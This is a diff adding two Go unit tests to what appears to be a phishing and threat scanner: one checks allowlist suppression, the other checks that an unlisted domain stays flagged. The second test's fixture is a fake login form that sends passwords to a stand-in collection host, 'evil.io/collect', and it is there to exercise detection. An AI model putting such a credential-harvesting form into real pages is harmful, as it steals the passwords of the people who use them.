@@ -34,6 +34,35 @@ func TestTrustedDomainSuppressesLowConfidenceSignals(t *testing.T) {
 	}
 }
 
+func TestAllowlistDomainSuppressesLowConfidenceSignals(t *testing.T) {
+	cfg := cfgpkg.ThreatScannerConfig{AllowlistDomains: []string{"partner.example"}}
+	result := EvaluateHeuristics(ScanInput{
+		Method:     "GET",
+		URL:        "https://partner.example/login",
+		Host:       "partner.example",
+		BodySample: []byte(`<form action="/login"><input type="password"></form>`),
+	}, cfg)
+	if !result.Suppressed {
+		t.Fatalf("expected allowlisted domain suppression, got %#v", result)
+	}
+	if result.RecommendedAction != ActionAllow {
+		t.Fatalf("expected allow after allowlist suppression, got %s", result.RecommendedAction)
+	}
+}
+
+func TestUnlistedDomainIsNotSuppressed(t *testing.T) {
+	cfg := cfgpkg.ThreatScannerConfig{AllowlistDomains: []string{"partner.example"}, TrustedDomains: []string{"accounts.google.com"}}
+	result := EvaluateHeuristics(ScanInput{
+		Method:     "GET",
+		URL:        "https://phish.example/login",
+		Host:       "phish.example",
+		BodySample: []byte(`<form action="https://evil.io/collect"><input type="password"></form>`),
+	}, cfg)
+	if result.Suppressed {
+		t.Fatalf("expected no suppression for unlisted domain, got %#v", result)
+	}
+}
+
 func TestDownloadQuarantineSignal(t *testing.T) {
 	result := EvaluateHeuristics(ScanInput{
 		Target:      ScanResponse,
